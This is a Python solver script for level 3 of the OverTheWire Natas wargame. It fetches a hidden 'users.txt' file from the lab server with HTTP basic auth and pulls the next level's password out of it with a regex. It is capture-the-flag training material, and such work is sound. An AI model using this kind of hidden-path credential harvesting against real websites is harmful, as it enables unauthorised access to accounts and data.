#!/usr/bin/env python3
"""
Natas Level 3 Solver
Author: AlperKurtulus
Date: 2025-11-12
"""

import requests
import re


def solve_natas3():
    url = "http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt"

    with open("natas3_password.txt", "r") as f:
        password = f.read().strip()
    username = "natas3"
    print("[*] Solving Level 3...")
    print("[*] URL: http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt")

    try:
        response = requests.get(url, auth=(username, password), timeout=10)

        if response.status_code != 200:
            print(f"[-] Error: Status code {response.status_code}")
            return None

        match = re.search(r"natas4:(\w+)", response.text)

        if match:
            next_password = match.group(1)
            print(f"[+] Next password: {next_password}")
            with open("natas4_password.txt", "w") as f:
                f.write(next_password)
            print("[+] Password saved to natas4_password.txt file!")
            return next_password
        else:
            print("[-] Password not found in response")
            print(response.text)
            return None

    except requests.RequestException as e:
        print(f"[-] Network error: {e}")
        return None


if __name__ == "__main__":
    solve_natas3()
